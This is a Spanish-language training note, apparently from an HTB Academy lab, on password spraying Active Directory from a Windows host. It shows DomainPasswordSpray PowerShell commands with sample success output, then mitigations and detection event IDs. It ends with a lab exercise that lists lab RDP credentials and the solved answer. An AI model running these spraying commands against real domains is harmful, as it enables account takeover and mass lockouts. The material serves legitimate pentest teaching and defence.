
# Password Spraying Interno - Desde Windows

## <mark style="color:purple;">Domain Password Spray</mark>

Desde un punto de apoyo en un host de Windows unido a un dominio, la herramienta [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) es muy eficaz. Si estamos autenticados en el dominio, la herramienta generará automáticamente una lista de usuarios desde Active Directory, consultará la política de contraseñas del dominio y excluirá cuentas de usuario en un solo intento de bloqueo. Al igual que ejecutamos el ataque de pulverización desde nuestro host Linux, también podemos proporcionar una lista de usuarios a la herramienta si estamos en un host Windows pero no estamos autenticados en el dominio.&#x20;

Es posible que nos encontremos con una situación en la que el cliente quiera que realicemos pruebas desde un dispositivo Windows administrado en su red en el que podamos cargar herramientas. Es posible que estemos físicamente en sus oficinas y deseemos realizar pruebas desde una máquina virtual de Windows, o podemos lograr un punto de apoyo inicial a través de algún otro ataque, autenticarnos en un host en el dominio y realizar la pulverización de contraseñas en un intento de obtener credenciales para un cuenta que tiene más derechos en el dominio.

Hay varias opciones disponibles para nosotros con la herramienta. Dado que el host está unido a un dominio, omitiremos la flag `-UserList` y dejaremos que la herramienta genere una lista para nosotros. Proporcionaremos la flag `Password` y una única contraseña y luego usaremos la flag `-OutFile` para escribir nuestra salida en un archivo para su uso posterior.

### **Usando DomainPasswordSpray.ps1**

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

También podríamos utilizar Kerbrute para realizar los mismos pasos de enumeración de usuarios y pulverización que se muestran en la sección anterior. La herramienta para este ejemplo está presente en el directorio `C:\Tools` del host de Windows proporcionado.

***

## <mark style="color:purple;">Mitigaciones</mark>

Se pueden tomar varias medidas para mitigar el riesgo de ataques de pulverización de contraseñas. Si bien ninguna solución única evitará por completo el ataque, un enfoque de defensa en profundidad hará que los ataques de pulverización de contraseñas sean extremadamente difíciles.

<table data-header-hidden><thead><tr><th width="211"></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Descripción</td></tr><tr><td><code>Autenticación Multi-factor</code></td><td>La autenticación multifactor puede reducir en gran medida el riesgo de ataques de pulverización de contraseñas. Existen muchos tipos de autenticación multifactor, como notificaciones automáticas a un dispositivo móvil, una contraseña de un solo uso (OTP) rotativa como Google Authenticator, clave RSA o confirmaciones de mensajes de texto. Si bien esto puede impedir que un atacante obtenga acceso a una cuenta, ciertas implementaciones de múltiples factores aún revelan si la combinación de nombre de usuario y contraseña es válida. Es posible que sea posible reutilizar esta credencial en otros servicios o aplicaciones expuestas. Es importante implementar soluciones multifactor con todos los portales externos.</td></tr><tr><td><code>Acceso Restringido</code></td><td>A menudo es posible iniciar sesión en aplicaciones con cualquier cuenta de usuario de dominio, incluso si el usuario no necesita acceder a ella como parte de su función. De acuerdo con el principio de privilegio mínimo, el acceso a la aplicación debe restringirse a quienes lo requieran.</td></tr><tr><td><code>Reducir el impacto de una explotación exitosa</code></td><td>Una solución rápida es garantizar que los usuarios privilegiados tengan una cuenta separada para cualquier actividad administrativa. Si es posible, también se deben implementar niveles de permiso específicos de la aplicación. También se recomienda la segmentación de la red porque si un atacante está aislado en una subred comprometida, esto puede ralentizar o detener por completo el movimiento lateral y un mayor compromiso.</td></tr><tr><td><code>Higiene de Contraseñas</code></td><td>Educar a los usuarios sobre cómo seleccionar contraseñas difíciles de adivinar, como frases de contraseña, puede reducir significativamente la eficacia de un ataque de pulverización de contraseñas. Además, el uso de un filtro de contraseña para restringir palabras comunes del diccionario, nombres de meses y estaciones, y variaciones en el nombre de la empresa hará que a un atacante le resulte bastante difícil elegir una contraseña válida para los intentos de fumigación.</td></tr></tbody></table>

***

## <mark style="color:purple;">Otras Consideraciones</mark>

Es vital asegurarse de que la política de bloqueo de contraseña de su dominio no aumente el riesgo de ataques de denegación de servicio. Si es muy restrictivo y requiere una intervención administrativa para desbloquear las cuentas manualmente, una contraseña descuidada puede bloquear muchas cuentas en un corto período.

***

## <mark style="color:purple;">Detección</mark>

Algunos indicadores de ataques externos de distribución de contraseñas incluyen muchos bloqueos de cuentas en un período corto, registros de servidores o aplicaciones que muestran muchos intentos de inicio de sesión con usuarios válidos o inexistentes, o muchas solicitudes en un período corto a una aplicación o URL específica.

En el registro de seguridad del controlador de dominio, muchas instancias del evento ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) durante un período corto pueden indicar un ataque de pulverización de contraseña. Las organizaciones deben tener reglas para correlacionar muchos errores de inicio de sesión dentro de un intervalo de tiempo establecido para activar una alerta. Un atacante más inteligente podría evitar la distribución de contraseñas de SMB y, en su lugar, apuntar a LDAP. Las organizaciones también deben monitorear el evento ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771) , que puede indicar un intento de distribución de contraseña LDAP. Para hacerlo, deberán habilitar el registro de Kerberos. Esta [publicación](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) detalla la investigación sobre la detección de la pulverización de contraseñas mediante el registro de eventos de seguridad de Windows.

Con estas mitigaciones ajustadas con precisión y con el registro habilitado, una organización estará bien posicionada para detectar y defenderse contra ataques internos y externos de rociado de contraseñas.

***

## <mark style="color:purple;">Password Spraying externo</mark>

Aunque está fuera del alcance de este módulo, la pulverización de contraseñas también es una forma común que utilizan los atacantes para intentar afianzarse en Internet. Hemos tenido mucho éxito con este método durante las pruebas de penetración para obtener acceso a datos confidenciales a través de bandejas de entrada de correo electrónico o aplicaciones web, como sitios de intranet externos. Algunos objetivos comunes incluyen:

* `Microsoft 0365`
* `Outlook Web Exchange`
* `Acceso web de intercambio`
* `Skype Empresarial`
* `Servidor Lync`
* `Portales de servicios de escritorio remoto (RDS) de Microsoft`
* `Portales Citrix que utilizan autenticación AD`
* `Implementaciones de VDI que utilizan autenticación AD como VMware Horizon`
* `Portales VPN (Citrix, SonicWall, OpenVPN, Fortinet, etc. que utilizan autenticación AD)`
* `Aplicaciones web personalizadas que utilizan autenticación AD`

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.50.186 (ACADEMY-EA-MS01)
Usuario " htb-student "
Contraseña " Academy_student_AD! "
```

Utilizando los ejemplos que se muestran en esta sección, busque un usuario con la contraseña `Winter2022`. Envíe el nombre de usuario como respuesta.

1. Necesitamos tener en el sistema el ejecutable `DomainPasswordSpray.ps1`
2. Importamos el ejecutable y lo ejecutamos indicando la contraseña `Winter2022`

```powershell
PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

<figure><img src="/files/u8TnlHhWSjJXDxl8tbbL" alt=""><figcaption></figcaption></figure>

Bingo! Encontramos un usuario válido: `dbranch` 🏆
